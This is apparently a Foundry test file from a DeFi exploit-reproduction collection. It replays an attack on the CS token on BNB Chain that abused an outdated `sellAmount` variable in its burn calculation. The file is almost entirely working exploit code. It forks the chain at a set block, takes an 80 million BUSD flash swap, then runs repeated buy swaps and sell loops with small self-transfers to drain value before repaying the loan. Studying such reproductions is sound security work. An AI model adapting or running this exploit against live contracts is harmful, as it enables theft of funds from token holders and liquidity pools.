// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1661098394130198528
// https://twitter.com/numencyber/status/1661207123102167041
// @TX
// https://explorer.phalcon.xyz/tx/bsc/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4
// @Summary
// Outdated global variable `sellAmount` for calculating `burnAmount`

contract CSExp is Test, IPancakeCallee {
    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 CS = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_466_976);
    }

    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18);
        pair.swap(80_000_000 ether, 0, address(this), bytes("123"));
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair));
        BUSD.approve(address(router), BUSD.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CS);
        for (uint256 i = 0; i < 99; ++i) {
            router.swapTokensForExactTokens(
                5000 ether, BUSD.balanceOf(address(this)), path, address(this), block.timestamp + 1000
            );
        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSD.balanceOf(address(this)), 1, path, 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5, block.timestamp + 1000
        );
        CS.approve(address(router), CS.balanceOf(address(this)));
        path[0] = address(CS);
        path[1] = address(BUSD);
        while (CS.balanceOf(address(this)) >= 3000 ether) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                3000 ether, 1, path, address(this), block.timestamp + 1000
            );
            CS.transfer(address(this), 2);
        }
        BUSD.transfer(msg.sender, 80_240_000 ether);
    }

    receive() external payable {}
}
